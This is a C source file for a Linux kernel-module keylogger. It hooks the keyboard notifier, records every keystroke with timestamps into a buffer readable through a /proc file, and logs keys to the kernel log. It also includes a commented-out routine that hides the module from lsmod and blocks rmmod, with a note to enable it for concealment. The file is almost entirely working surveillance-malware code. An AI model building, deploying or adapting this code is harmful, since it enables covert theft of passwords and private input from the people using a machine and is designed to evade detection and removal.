#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/seq_file.h>
#include <linux/proc_fs.h>	
#include <linux/time.h>

MODULE_LICENSE("GPL");


#define BUF_SIZE (PAGE_SIZE << 2) // 2*2*PAGE_SIZE
#define LINE_LIMIT 50; /*50 chars per line*/
// Write_increment is in seconds
#define WRITE_INCREMENT 10

// Store current_time (rather than reallocating everytime)
static struct timespec *our_current_time;
// For storing buffer
struct line_buf {
	char buffer[BUF_SIZE];
	size_t pos;
	time_t last_write;
	char time_string[80];
};

static struct line_buf key_buf;

static void store_time_in_buffer(struct timespec * current_time);

/*
	This section deals with the proc file and using seq_file interface for printing buffer to the proc file
*/
#define PROC_NAME	"buffer_file"
static int show(struct seq_file *m, void *v)
{
	seq_printf(m, key_buf.buffer);
	return 0;
}

static int open(struct inode *inode, struct  file *file)
{
	return single_open(file, show, NULL);
}

static const struct file_operations fops = {
	.llseek = seq_lseek,
	.open = open,
	.owner = THIS_MODULE,
	.read = seq_read,
	.release = single_release,
};

static int create_keylogger_file(void)
{
	struct proc_dir_entry *entry;
	entry = proc_create(PROC_NAME, 0, NULL,&fops);

	if (!entry){
		return -ENOMEM;
	}
	return 0;
}

static void remove_keylogger_file(void)
{
	remove_proc_entry(PROC_NAME, NULL);
}

/*Key code mapping*/
static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},                                         // 119
};

static int keylogger_callback(struct notifier_block *nblock,
		unsigned long code,
		void *_param);

static struct notifier_block keylogger_blk = {
	.notifier_call = keylogger_callback,
};


/* This is where the keylogging is handled */
int log_keys(int keycode, int shift_mask)
{
	size_t key_length;
	getnstimeofday(our_current_time);

	/*handling unwanted keystrokes*/
	if (keycode == 42 || keycode == 62 || keycode == 29 || (keycode >= 102 && keycode <= 110)) {
		return NOTIFY_OK;
	}

	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
		const char *us_key = (shift_mask == 1)
		? us_keymap[keycode][1]
		: us_keymap[keycode][0];

		printk(KERN_INFO "Key: %s",us_key);

		key_length = strlen(us_key);

		if ( key_length < 1) {
			return NOTIFY_OK;
		}

		/*Handle backspace*/
		if (strcmp(us_key,"_BACKSPACE_") == 0) {
			if (key_buf.pos >= 1 && key_buf.buffer[key_buf.pos-1]!='\n') {
				printk(KERN_INFO "DELETE");
				key_buf.buffer[--key_buf.pos] = 0;
			}
			return NOTIFY_OK;
		}


		if ((key_buf.pos + key_length >= BUF_SIZE)) {
			key_buf.pos = 0;
		}

		memcpy(key_buf.buffer + key_buf.pos, us_key, key_length);
		key_buf.pos += key_length;

	}

	// If time increment has passed since last log_key write timelog to file
	if (our_current_time->tv_sec - key_buf.last_write >= WRITE_INCREMENT) {
		store_time_in_buffer(our_current_time);
	}

	key_buf.last_write = our_current_time->tv_sec;

	return NOTIFY_OK;
}

int keylogger_callback(struct notifier_block *nblock,
		  unsigned long code,
		  void *_param)
{
	struct keyboard_notifier_param *param = _param;

	/* Trace only when a key is pressed down */
	if (!(param->down)) {
		return NOTIFY_OK;
	}

	/* Convert logged keycode to readable string and store inside buffer */
	return log_keys(param->value, param->shift);
}

/* Used to store current time into the buffer */
void store_time_in_buffer(struct timespec * current_time){
	size_t timestring_length;
	memset(key_buf.time_string,0,strlen(key_buf.time_string));
	sprintf(key_buf.time_string,"\r[TIME-LOG (time_t): %ld]\n",(key_buf.last_write));
	
	timestring_length = strlen(key_buf.time_string);

	if ((key_buf.pos + timestring_length >= BUF_SIZE)) {
		key_buf.pos = 0;
	}
	memcpy(key_buf.buffer + key_buf.pos, key_buf.time_string , timestring_length);
	key_buf.pos += timestring_length;
}



/*This function will hide keylogger from the lsmod command
Once hidden module cannot be removed with rmmod command
*/
/*
static void hide_keylogger(void)
{
  list_del_init(&__this_module.list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
}
*/

static int init_keylogger(void)
{
	/*Used for registering the callback function to the keyboard handler*/
	register_keyboard_notifier(&keylogger_blk);

	// Initialize timer
	our_current_time = vmalloc(sizeof(struct timespec));
	getnstimeofday(our_current_time);
	store_time_in_buffer(our_current_time);
	printk(KERN_INFO "[TIME-LOG (time_t): %s]\n",(key_buf.time_string));

	//Uncomment to hide keylogger, but dont do it on development
	//hide_keylogger();

	return create_keylogger_file();
}

static void remove_keylogger(void)
{
	unregister_keyboard_notifier(&keylogger_blk);
	remove_keylogger_file();
}

module_init(init_keylogger);
module_exit(remove_keylogger);



/*
RESOURCES: 
- http://redgetan.cc/lets-write-a-kernel-keylogger/
- https://github.com/jarun/keysniffer/ "Inspired the implementation for using a callback function on the event handler"
  Keymap references:
- https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
- http://www.quadibloc.com/comp/scan.htm
*/
